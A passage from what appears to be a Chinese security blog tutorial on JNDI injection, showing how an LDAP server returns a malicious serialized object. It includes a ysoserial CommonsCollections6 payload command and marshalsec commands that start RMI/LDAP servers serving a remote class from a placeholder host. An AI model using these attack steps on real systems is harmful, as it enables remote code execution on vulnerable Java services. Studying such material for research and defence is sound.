referenceWrapper);</span><br></pre></td></tr></table></figure>

<p>运行之后，客户端运行代码即可弹出计算器。</p>
<blockquote>
<p>在运行过程，可能需要多运行几次才能成功。在本地测试时，时而失败，时而成功。可能与EL表达式有关。</p>
</blockquote>
<h2 id="利用LDAP返回恶意的序列化对象"><a href="#利用LDAP返回恶意的序列化对象" class="headerlink" title="利用LDAP返回恶意的序列化对象"></a>利用LDAP返回恶意的序列化对象</h2><p>JNDI与LDAP之间交互，其中Java对象在LDAP目录有多种存储形式:  </p>
<ul>
<li>Java序列化</li>
<li>JNDI Reference</li>
<li>Marshalled对象</li>
<li>Remote Location(已弃用)</li>
</ul>
<p>LDAP可以为存储的Java对象指定多种属性:</p>
<ul>
<li>javaCodeBase</li>
<li>objectClass</li>
<li>javaFactory</li>
<li>javaSerializedData</li>
</ul>
<p>第二种方法中利用的是LDAP服务器支持直接返回一个Java对象的序列化数据。若Java对象的javaSerializedData属性值不为空，则客户端的obj.decodeObject()会对此字段值的内容进行反序列化。定位到obj.decodeObject()。</p>
<p><img src="20.png" alt="">  </p>
<p><img src="21.png" alt=""></p>
<p>当javaSerializedData属性存在时，首先会获取到一个classloader。然后进入obj.deserializeObject()方法。</p>
<p><img src="22.png" alt=""></p>
<p>在这里面最终会进入到readObject()方法。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>假设目标系统中存在着有漏洞的CommonsCollections库，那么首先可以利用ysoserial生成一个利用链，这里选择了commonscollections:3.2.1以及CommonsCollections6。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 &#39;&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&#39;|base64</span><br></pre></td></tr></table></figure>

<p><img src="23.png" alt=""></p>
<p>最终的LDAP服务器与前面比较，在sendResult时，对发送的Entry添加javaSerializedData属性，属性值为序列化的payload。</p>
<p><img src="24.png" alt=""></p>
<p>在复现时，为了避免codebase的影响，将其他属性注释掉了。最终在客户端lookup时弹出了计算器。</p>
<h1 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h1><p>在实际遇到这样的漏洞时，直接利用工具会比较方便。</p>
<h2 id="marshalsec"><a href="#marshalsec" class="headerlink" title="marshalsec"></a>marshalsec</h2><p>marshalsec可以很方便地启动一个LDAP/RMI Server</p>
<h3 id="rmi"><a href="#rmi" class="headerlink" title="rmi"></a>rmi</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;ip:port&#x2F;package&#x2F;#Class 1099</span><br></pre></td></tr></table></figure>

<h3 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;ip:port&#x2F;package&#x2F;#Class 1389</span><br></pre></td></tr></table></figure>


<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://y4er.com/post/attack-java-jndi-rmi-ldap-2/" target="_blank" rel="noopener">攻击Java中的JNDI、RMI、LDAP(二)</a></li>
<li><a href="https://xz.aliyun.com/t/6633" target="_blank" rel="noopener">JNDI注入整体的调用栈分析</a></li>
<li><a href="https://www.anquanke.com/post/id/199481#h3-7" target="_blank" rel="noopener">JNDI with RMI</a></li>
<li><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">如何绕过高版本JDK的限制进行JNDI注入利用</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JNDI</tag>
      </tags>
  </entry>
</search>
